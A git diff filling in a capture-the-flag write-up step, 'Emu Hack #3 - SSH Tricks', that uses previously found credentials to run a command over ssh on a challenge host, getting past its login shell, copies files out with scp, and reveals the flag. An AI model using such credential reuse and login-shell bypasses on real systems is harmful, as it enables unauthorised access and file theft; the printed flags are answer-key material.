@@ -123,14 +123,36 @@ UWA{N()w_y0U_kN0W_40w_2_u53_g17!1!!}
 
 ## Emu Hack #3 - SSH Tricks
 ### Step 1
-A clear, and detailed description.  
-
-### Step 2
-### Step X
-
+#### Run commands directly using SSH：
+As we got the username and password from last question:
+```
+username: emu001
+password: feathers4life24
+```
+Try using SSH to directly execute commands on a remote host, such as listing the contents of the/home/emu001 directory:
+```
+ssh -p 2022 emu001@34.116.68.59 "ls /home/emu001"
+```
+Then we got:
+```
+note_to_angry_emu_hacker.txt
+top_secret.png
+```
+Then try to copy it to local folder:
+```
+scp -P 2022 emu001@34.116.68.59:/home/emu001/* ./
+```
+```
+┌──(kali㉿kali)-[~/emu]
+└─$ scp -P 2022 emu001@34.116.68.59:/home/emu001/* ./
+emu001@34.116.68.59's password: 
+note_to_angry_emu_hacker.txt                        100%  313     2.5KB/s   00:00    
+top_secret.png                                      100%  475KB 912.0KB/s   00:00  
+```
+Obviously, `top_secret.png` is what we are looking for. Now open it from where we just downloaded.
 #### Flag Found
 ```bash
-UWA{xxxxxxxxxx}
+UWA{how_did_u_get_pass_that_login_shell?????}
 ```
 
 ## Emu Hack #4 - Git Gud or GTFO Bin
